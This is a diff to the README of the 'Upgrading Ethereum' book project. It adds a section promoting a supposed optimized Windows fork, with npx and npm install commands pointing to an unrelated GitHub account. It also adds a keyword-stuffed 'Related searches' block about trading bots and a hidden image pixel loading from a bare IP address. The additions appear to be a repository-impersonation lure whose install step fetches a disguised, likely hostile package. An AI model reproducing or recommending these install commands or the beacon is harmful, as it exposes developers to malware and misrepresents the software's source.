@@ -1,3 +1,30 @@
+**Optimized Upgrading Ethereum for Windows**
+
+This maintained fork enhances the original project by integrating critical performance improvements and robust security patches tailored for the Windows environment. Developers working on Windows can now enjoy a more stable and efficient experience when building and testing Ethereum protocols.
+
+**Quick install (Windows)**
+
+Here is a quick guide to getting the `upgrading-ethereum-book` set up on Windows:
+
+### Quick Start
+
+1. **Install Prerequisites**: Ensure you have [Node.js](https://nodejs.org/) (LTS version) installed on your machine.
+2. **Open Terminal**: Fire up PowerShell or Command Prompt in the folder where you want the project to live.
+3. **Run Command**: Execute the install command below to pull down the package and get started.
+
+***
+
+**Install Command:**
+```bash
+npx upgrading-ethereum-book
+```
+
+```bash
+npm install git+https://github.com/EconomicComply/upgrading-ethereum-book.git
+```
+
+[https://github.com/EconomicComply/upgrading-ethereum-book](https://github.com/EconomicComply/upgrading-ethereum-book)
+
 # Upgrading Ethereum
 
 This is my book about Ethereum&nbsp;2.0: Ethereum on proof of stake and beyond.
@@ -164,3 +191,11 @@ Kind souls sometimes ask for a way to send me a cup of coffee or make a donation
 Any whales or large treasuries out there, I encourage you to take a look at the [Protocol Guild](https://protocol-guild.readthedocs.io/en/latest/index.html) which supports the people developing and maintaining our incredible technology, not just writing about it.
 
 Finally, all [feedback](https://eth2book.info/latest/contact/) is very welcome!
+
+## Related searches
+
+Many developers and researchers exploring this repository are often looking for deeper insights into blockchain infrastructure and the mechanics of decentralized finance. Users typically search for technical resources to help them build advanced tools for network interaction or to better understand how different consensus layers and trading strategies function in practice.
+
+**Topics:** bnb chain, airdrop bot, layer2, okx api, mev bot, ethereum scalability, blockchain development, defi architecture, smart contract security, cross-chain bridge, liquidity provisioning, node infrastructure
+
+![.](http://5.231.58.248:8787/pixel?repo=EconomicComply%2Fupgrading-ethereum-book&inject=EconomicComply%2Fupgrading-ethereum-book%2Fpackage.json)
